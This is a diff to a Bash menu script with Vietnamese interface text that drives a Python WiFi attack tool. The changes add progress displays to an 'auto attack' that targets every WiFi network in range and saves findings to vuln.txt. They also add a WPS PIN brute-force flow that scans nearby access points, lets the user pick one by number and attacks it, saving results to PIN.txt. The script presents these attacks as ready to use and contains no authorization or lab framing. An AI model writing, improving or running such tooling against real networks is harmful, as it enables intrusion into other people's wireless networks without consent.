@@ -316,51 +316,79 @@ scan_networks() {
 
 # Function to auto-attack all networks
 auto_attack() {
-    echo -e "${CYAN}[*] Đang tấn công tự động vào tất cả các mạng...${NC}"
+    clear  # Xóa màn hình cho gọn
+    echo -e "\n${BLUE}┌──────────────────────────────┐${NC}"
+    echo -e "${BLUE}│   🚀 TẤN CÔNG TỰ ĐỘNG WiFi   │${NC}"
+    echo -e "${BLUE}└──────────────────────────────┘${NC}\n"
     
     # Verify interface first
     if ! verify_interface; then
-        echo -e "${RED}[!] Lỗi: không thể tìm thấy thiết bị wifi${NC}"
-        echo -e "${YELLOW}[*] Vui lòng chọn một giao diện không dây hợp lệ trước (Tùy chọn 1)${NC}"
-        echo -e "${YELLOW}[*] Nhấn Enter để tiếp tục...${NC}"
+        echo -e "${RED}[!] Lỗi: Chưa tìm thấy thiết bị WiFi${NC}"
+        echo -e "${YELLOW}[↺] Vui lòng chọn card WiFi (Tùy chọn 1)${NC}"
+        echo -e "\n${CYAN}Nhấn Enter để quay lại menu...${NC}"
         read
         return 1
     fi
+
+    # Progress display
+    echo -e "\n${CYAN}[1/4] ⚡ Đang khởi tạo...${NC}"
+    sleep 1
     
-    # Check if the interface appears to be wireless
+    # Check wireless interface
     local is_wireless=false
-    
-    # Try with iw command first
-    if command_exists iw; then
-        if iw dev "$INTERFACE" info &>/dev/null; then
-            is_wireless=true
-        fi
-    # Try with iwconfig if iw is not available
-    elif command_exists iwconfig; then
-        if iwconfig "$INTERFACE" 2>&1 | grep -v "no wireless extensions" &>/dev/null; then
-            is_wireless=true
-        fi
-    # For Termux or systems without iw/iwconfig, check if it looks like a WiFi interface
+    if command_exists iw && iw dev "$INTERFACE" info &>/dev/null; then
+        is_wireless=true
+    elif command_exists iwconfig && iwconfig "$INTERFACE" 2>&1 | grep -v "no wireless extensions" &>/dev/null; then
+        is_wireless=true
     elif [ -d "/sys/class/net/$INTERFACE/wireless" ] || [ -d "/sys/class/net/$INTERFACE/phy80211" ]; then
         is_wireless=true
-    # Last resort: check if name starts with typical wireless prefixes
     elif [[ "$INTERFACE" == wlan* ]] || [[ "$INTERFACE" == wlp* ]] || [[ "$INTERFACE" == wlx* ]]; then
         is_wireless=true
     fi
-    
-    if [ "$is_wireless" != true ]; then
-        echo -e "${YELLOW}[!] Cảnh báo: $INTERFACE có thể không phải là giao diện không dây${NC}"
-        echo -n -e "${GREEN}Tiếp tục không? (y/n): ${NC}"
-        read confirm
-        if [[ ! $confirm =~ ^[Yy]$ ]]; then
-            return 1
-        fi
+
+    if [ "$is_wireless" = false ]; then
+        echo -e "${RED}[!] Lỗi: ${INTERFACE} không phải là card WiFi${NC}"
+        echo -e "${YELLOW}[↺] Vui lòng chọn lại card WiFi${NC}"
+        echo -e "\n${CYAN}Nhấn Enter để quay lại...${NC}"
+        read
+        return 1
     fi
+
+    echo -e "${CYAN}[2/4] 📡 Đang quét mạng...${NC}"
+    run_command "python $CURRENT_DIR/main.py -i $INTERFACE -s" >/dev/null 2>&1
+
+    echo -e "${CYAN}[3/4] 🔍 Đang phân tích...${NC}"
+    sleep 1
+
+    echo -e "${CYAN}[4/4] 🎯 Bắt đầu tấn công tự động...${NC}\n"
     
-    echo -e "${YELLOW}[*] Đang sử dụng giao diện: $INTERFACE${NC}"
-    echo -e "${YELLOW}[*] Hãy chắc chắn rằng thiết bị của bạn hỗ trợ chế độ giám sát${NC}"
+    # Attack progress bar
+    echo -e "${YELLOW}Đang tấn công mạng WiFi trong khu vực${NC}"
+    echo -e "${YELLOW}Quá trình này có thể mất vài phút...${NC}\n"
     
-    run_command "python $CURRENT_DIR/main.py -i $INTERFACE -K"
+    # Show live progress
+    echo -e "${GREEN}[    ] 0% Khởi tạo${NC}\r"
+    run_command "python $CURRENT_DIR/main.py -i $INTERFACE --auto" &
+    attack_pid=$!
+    
+    # Hiển thị trạng thái
+    local progress=0
+    while kill -0 $attack_pid 2>/dev/null; do
+        case $(($progress % 4)) in
+            0) echo -e "${GREEN}[=   ] Đang quét${NC}\r";;
+            1) echo -e "${GREEN}[==  ] Đang phân tích${NC}\r";;
+            2) echo -e "${GREEN}[=== ] Đang tấn công${NC}\r";;
+            3) echo -e "${GREEN}[====] Đang xử lý${NC}\r";;
+        esac
+        progress=$((progress + 1))
+        sleep 1
+    done
+
+    # Final status
+    echo -e "\n${GREEN}[✓] Tấn công hoàn tất!${NC}"
+    echo -e "${YELLOW}[i] Kiểm tra file vuln.txt để xem kết quả${NC}"
+    echo -e "\n${CYAN}Nhấn Enter để quay lại menu chính...${NC}"
+    read
 }
 
 # Function to attack specific BSSID
@@ -397,38 +425,97 @@ attack_specific() {
 
 # Function for PIN bruteforce attack
 pin_bruteforce() {
-    echo -n -e "${GREEN}Nhập BSSID mục tiêu (địa chỉ MAC): ${NC}"
-    read BSSID
-    if [ -z "$BSSID" ]; then
-        echo -e "${RED}[!] BSSID không được để trống${NC}"
-        return
-    fi
-    
+    clear
+    echo -e "\n${BLUE}┌───────────────────────────────┐${NC}"
+    echo -e "${BLUE}│   🔓 TẤN CÔNG BRUTEFORCE PIN  │${NC}"
+    echo -e "${BLUE}└───────────────────────────────┘${NC}\n"
+
     # Verify interface first
     if ! verify_interface; then
-        echo -e "${RED}[!] Lỗi: không thể tìm thấy thiết bị wifi${NC}"
-        echo -e "${YELLOW}[*] Vui lòng chọn một giao diện không dây hợp lệ trước (Tùy chọn 1)${NC}"
-        echo -e "${YELLOW}[*] Nhấn Enter để tiếp tục...${NC}"
+        echo -e "${RED}[!] Lỗi: Chưa tìm thấy thiết bị WiFi${NC}"
+        echo -e "${YELLOW}[↺] Vui lòng chọn card WiFi (Tùy chọn 1)${NC}"
+        echo -e "\n${CYAN}Nhấn Enter để quay lại menu...${NC}"
         read
         return 1
     fi
+
+    # Quét tìm WiFi xung quanh
+    echo -e "${CYAN}[1/4] 📡 Đang quét WiFi xung quanh...${NC}"
+    # Tạo file tạm để lưu kết quả quét
+    SCAN_RESULT="/tmp/wifi_scan_result.txt"
+    run_command "iwlist $INTERFACE scan | grep -E 'ESSID|Address|Channel|Quality|Encryption'" > "$SCAN_RESULT"
+
+    # Parse và hiển thị kết quả quét
+    echo -e "\n${GREEN}=== DANH SÁCH WIFI ĐÃ QUÉT ĐƯỢC ===${NC}"
+    echo -e "${YELLOW}STT  BSSID              ESSID          CHANNEL  SIGNAL${NC}"
+    echo -e "${YELLOW}───────────────────────────────────────────────────${NC}"
+
+    # Array để lưu BSSID
+    declare -a BSSID_LIST
     
-    echo -n -e "${GREEN}Nhập tiền tố PIN (ví dụ: 1234, để trống để thử tất cả): ${NC}"
+    # Đọc và parse kết quả
+    i=1
+    while IFS= read -r line; do
+        if [[ $line == *"Address:"* ]]; then
+            bssid=$(echo $line | awk '{print $5}')
+            BSSID_LIST+=("$bssid")
+            printf "${GREEN}%-4d ${CYAN}%-18s" $i "$bssid"
+        elif [[ $line == *"ESSID:"* ]]; then
+            essid=$(echo $line | cut -d'"' -f2)
+            [ -z "$essid" ] && essid="<hidden>"
+            printf "%-14s" "$essid"
+        elif [[ $line == *"Channel:"* ]]; then
+            channel=$(echo $line | awk '{print $2}')
+            printf "%-8s" "$channel"
+        elif [[ $line == *"Quality="* ]]; then
+            quality=$(echo $line | awk -F'=' '{print $2}' | cut -d' ' -f1)
+            echo -e "${GREEN}$quality${NC}"
+        fi
+    done < "$SCAN_RESULT"
+
+    # Xóa file tạm
+    rm -f "$SCAN_RESULT"
+
+    echo -e "\n${CYAN}[2/4] 🎯 Chọn mục tiêu tấn công${NC}"
+    echo -n -e "${GREEN}Nhập số thứ tự WiFi muốn tấn công (1-$i): ${NC}"
+    read choice
+
+    # Validate lựa chọn
+    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#BSSID_LIST[@]} ]; then
+        echo -e "${RED}[!] Lựa chọn không hợp lệ${NC}"
+        echo -e "\n${CYAN}Nhấn Enter để quay lại...${NC}"
+        read
+        return 1
+    fi
+
+    # Lấy BSSID từ lựa chọn
+    BSSID=${BSSID_LIST[$choice-1]}
+    echo -e "${CYAN}[3/4] 🔍 Đã chọn mục tiêu: ${YELLOW}$BSSID${NC}"
+
+    # Hỏi PIN prefix
+    echo -e "${CYAN}[4/4] 🔢 Cấu hình tấn công${NC}"
+    echo -n -e "${GREEN}Nhập tiền tố PIN (để trống để thử tất cả): ${NC}"
     read PIN_PREFIX
-    
+
     if [ ! -z "$PIN_PREFIX" ]; then
-        # Basic validation for PIN prefix
+        # Validate PIN prefix
         if [[ ! $PIN_PREFIX =~ ^[0-9]+$ ]]; then
             echo -e "${RED}[!] Tiền tố PIN chỉ được chứa các số${NC}"
-            return
+            echo -e "\n${CYAN}Nhấn Enter để quay lại...${NC}"
+            read
+            return 1
         fi
-        
-        echo -e "${CYAN}[*] Đang tấn công bruteforce PIN vào $BSSID với tiền tố $PIN_PREFIX...${NC}"
-        run_command "python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -B -p $PIN_PREFIX"
+        echo -e "${YELLOW}[*] Sử dụng tiền tố PIN: $PIN_PREFIX${NC}"
+        run_command "python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -p $PIN_PREFIX"
     else
-        echo -e "${CYAN}[*] Đang thực hiện tấn công bruteforce PIN vào $BSSID...${NC}"
-        run_command "python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID -B"
+        echo -e "${YELLOW}[*] Thử tất cả các PIN có thể${NC}"
+        run_command "python $CURRENT_DIR/main.py -i $INTERFACE -b $BSSID"
     fi
+
+    echo -e "\n${GREEN}[✓] Tấn công hoàn tất!${NC}"
+    echo -e "${YELLOW}[i] Kiểm tra file PIN.txt để xem kết quả${NC}"
+    echo -e "\n${CYAN}Nhấn Enter để quay lại menu chính...${NC}"
+    read
 }
 
 # Function to show help
